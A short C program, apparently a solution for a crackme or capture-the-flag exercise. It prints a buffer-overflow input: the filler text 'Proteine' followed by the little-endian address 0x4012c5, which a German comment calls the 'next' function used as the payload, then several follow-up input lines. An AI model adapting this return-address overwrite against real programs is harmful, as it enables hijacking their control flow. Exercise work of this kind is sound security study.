#include <string.h>
#include <stdio.h>

int main() {

  char overflow[16];
  memset(overflow, '\0', 16);
  //filler für den buffer overflow
  overflow[0] = 'P';
  overflow[1] = 'r';
  overflow[2] = 'o';
  overflow[3] = 't';
  overflow[4] = 'e';
  overflow[5] = 'i';
  overflow[6] = 'n';
  overflow[7] = 'e';

  // adresse der next funktion als "payload" sollte immer 0x4012c5 sein
  overflow[8] = 0xc5;
  overflow[9] = 0x12;
  overflow[10] = 0x40;

  printf("%s", overflow);
  printf("\n");
  puts("exit");
  puts("zzzz");
  puts("i<3u");
}